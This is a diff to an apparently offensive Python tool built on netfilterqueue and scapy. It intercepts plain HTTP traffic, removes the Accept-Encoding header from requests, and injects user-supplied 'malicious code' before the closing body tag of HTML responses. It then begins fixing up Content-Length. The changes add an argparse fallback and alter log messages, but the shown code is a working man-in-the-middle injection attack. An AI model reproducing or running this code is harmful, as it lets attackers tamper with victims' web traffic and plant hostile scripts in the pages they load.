@@ -3,11 +3,17 @@ import netfilterqueue as netq
 import scapy.all as scapy
 import re
 import optparse
+import argparse
 
 def get_args():
-    parser = optparse.OptionParser()
-    parser.add_option("-c", "--code", dest="mal_code", help="Malicious code that needs to be Injected")
-    (val, args) = parser.parse_args()
+    try:
+        parser = optparse.OptionParser()
+        parser.add_option("-c", "--code", dest="mal_code", help="Malicious code that needs to be Injected.")
+        (val, args) = parser.parse_args()
+    except:
+        parser = argparse.ArgumentParser()
+        parser.add_argument("-c", "--code", dest="mal_code", help="Malicious code that needs to be Injected.")
+        val = parser.parse_args()
     if not val.mal_code:
         parser.error("ERROR Missing argument, use --help for more info")
     return val
@@ -22,11 +28,11 @@ def work_packet(packet):
     if use_packet.haslayer(scapy.Raw):
         raw_load = use_packet[scapy.Raw].load
         if use_packet[scapy.TCP].dport == 80:
-            print("[+] REQUEST##############")
+            print("[+] REQUEST...")
             raw_load = re.sub("Accept-Encoding:.*?\\r\\n", "", raw_load)
         elif use_packet[scapy.TCP].sport == 80:
-            print("[+] RESPONSE#############")
-            insert = str(value.mal_code)
+            print("[+] RESPONSE...")
+            insert = value.mal_code
             raw_load = raw_load.replace("</body>", insert + "</body>")
             content_len = re.search("(?:Content-Length:\s)(\d*)", raw_load)
             if content_len and "text/html" in raw_load:
